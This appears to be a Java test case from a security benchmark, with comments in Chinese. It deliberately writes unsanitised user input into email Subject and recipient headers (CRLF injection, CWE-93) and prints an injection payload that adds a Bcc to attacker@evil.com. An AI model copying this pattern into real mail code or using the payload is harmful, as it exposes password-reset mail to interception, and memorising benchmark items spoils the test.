package com.jsef.benchmark.vuln;

import jakarta.mail.Message;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeMessage;

/**
 * JSEF-Benchmark L2 — SMTP 邮件头注入（CWE-93）
 *
 * 难度：L2（多跳无断点）。用户可控的收件人地址与展示名未经 CR/LF 剥离，
 * 经两个中间变量拼入 MIME 邮件头。
 *
 * MIME 头按 RFC 5322 解析：CR（0x0D）/ LF（0x0A）是头字段终止符。攻击载荷
 * "\r\nBcc: attacker@evil.com\r\n" 会终止当前 Subject 头字段并追加新的 Bcc 头，
 * 实现密送抄送 / 伪造发件人 —— 邮件头注入（CWE-93）。该行为由 jakarta.mail
 * 在生成报文时按 MIME 语义执行，属真实头解析，非展示文本。
 *
 * CWE-93 Improper Neutralization of CRLF Sequences ('CRLF Injection')。
 * 安全底线：Payload 仅 localhost 演示语义，不提供真实利用脚本。
 *
 * 修复要点（对照 MailHeaderInjectionSafe.java）：剥离 CR/LF + RFC 头字段校验 + 仅受管收件人。
 */
public class MailHeaderInjectionVuln {

    /**
     * 危险路径：subject / recipient 未清洗即写入邮件头。
     *
     * @param toAddr   用户可控收件人地址（可含 CRLF 载荷）
     * @param userName 用户可控显示名（注入 Subject 头）
     */
    public void send(String toAddr, String userName) throws Exception {
        MimeMessage msg = new MimeMessage(null);
        String subject = "Password reset for " + userName; // 中间变量 1：污点进入 Subject
        String recipient = toAddr;                         // 中间变量 2：污点进入 Recipient
        // [CHECKPOINT id=JSEF-MAILINJ-001 cwe=93 level=L2 source=recipient/subject with CRLF sink=MailMessage.setSubject/setRecipients header injection expect=VULN]
        msg.setSubject(subject); // [VULN] sink：CR/LF 终止 Subject 头并注入额外头字段
        msg.setRecipients(Message.RecipientType.TO, new InternetAddress(recipient)); // sink：可注入 Bcc / 伪造发件人
    }
}
